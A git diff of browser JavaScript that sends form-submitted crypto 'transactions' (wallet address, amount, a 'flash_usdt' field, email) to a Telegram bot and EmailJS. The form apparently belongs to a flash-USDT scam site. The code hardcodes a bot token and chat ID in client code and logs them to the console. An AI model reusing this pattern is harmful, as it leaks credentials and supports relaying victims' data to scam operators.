@@ -2,6 +2,29 @@
 const TELEGRAM_BOT_TOKEN = '8240287573:AAE4NTxWAmBB0GezTFnK-rrMIr5j5BYxb1c'; // Replace with your bot token
 const TELEGRAM_CHAT_ID = '8191508290'; // Replace with your chat ID
 
+// Test Telegram connection
+async function testTelegramConnection() {
+    try {
+        console.log('🧪 Testing Telegram connection...');
+        console.log('🤖 Bot Token:', TELEGRAM_BOT_TOKEN);
+        console.log('💬 Chat ID:', TELEGRAM_CHAT_ID);
+        
+        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getMe`);
+        const botInfo = await response.json();
+        
+        if (response.ok && botInfo.ok) {
+            console.log('✅ Telegram Bot is working:', botInfo.result);
+            return true;
+        } else {
+            console.error('❌ Telegram Bot error:', botInfo);
+            return false;
+        }
+    } catch (error) {
+        console.error('❌ Telegram connection test failed:', error);
+        return false;
+    }
+}
+
 // Email service configuration (using EmailJS)
 const EMAILJS_SERVICE_ID = 'service_o932bxz'; // Replace with your EmailJS service ID (e.g., service_abc123)
 const EMAILJS_TEMPLATE_ID = 'template_db6y41l'; // Replace with your EmailJS template ID (e.g., template_xyz789)
@@ -13,6 +36,13 @@ async function sendTelegramNotification(transactionData) {
         console.log('🤖 Telegram Bot Token:', TELEGRAM_BOT_TOKEN);
         console.log('💬 Telegram Chat ID:', TELEGRAM_CHAT_ID);
         console.log('📊 Transaction Data:', transactionData);
+        
+        // Test Telegram connection first
+        const connectionTest = await testTelegramConnection();
+        if (!connectionTest) {
+            console.error('❌ Telegram connection test failed, skipping notification');
+            return false;
+        }
         
         const message = `
 🚨 NEW TRANSACTION SUBMITTED 🚨
@@ -47,10 +77,10 @@ async function sendTelegramNotification(transactionData) {
         });
 
         console.log('📱 Telegram API Response Status:', response.status);
-        const responseData = await response.text();
+        const responseData = await response.json();
         console.log('📱 Telegram API Response:', responseData);
 
-        if (response.ok) {
+        if (response.ok && responseData.ok) {
             console.log('✅ Telegram notification sent successfully');
             return true;
         } else {
@@ -361,6 +391,25 @@ async function handleTransactionSubmission(form, transactionType) {
         alert('An error occurred while processing your transaction. Please try again.');
         return false;
     }
+}
+
+// Test function to manually test Telegram (call this from browser console)
+async function testTelegramNotification() {
+    console.log('🧪 Testing Telegram notification...');
+    
+    const testData = {
+        network: 'TEST (TRC20)',
+        transaction_id: 'TEST_' + Date.now(),
+        wallet_address: 'TEST_WALLET_ADDRESS',
+        amount: '1.00',
+        flash_usdt: '30',
+        email: 'test@example.com',
+        timestamp: new Date().toISOString()
+    };
+    
+    const result = await sendTelegramNotification(testData);
+    console.log('🧪 Test result:', result);
+    return result;
 }
 
 // Initialize form handlers when DOM is loaded
